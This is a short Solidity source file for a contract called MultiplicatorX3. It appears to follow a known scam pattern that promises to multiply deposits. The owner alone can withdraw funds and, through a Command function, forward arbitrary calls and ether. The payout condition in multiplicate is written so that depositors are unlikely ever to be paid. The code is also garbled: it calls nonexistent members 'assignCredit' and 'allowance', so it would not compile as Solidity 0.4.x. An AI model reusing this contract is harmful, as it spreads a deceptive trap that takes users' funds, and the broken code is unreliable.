// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Director = msg.sender;

    function() public payable{}

    function withdrawFunds()
    payable
    public
    {
        require(msg.sender == Director);
        Director.assignCredit(this.allowance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Director);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.allowance)
        {
            adr.assignCredit(this.allowance+msg.value);
        }
    }
}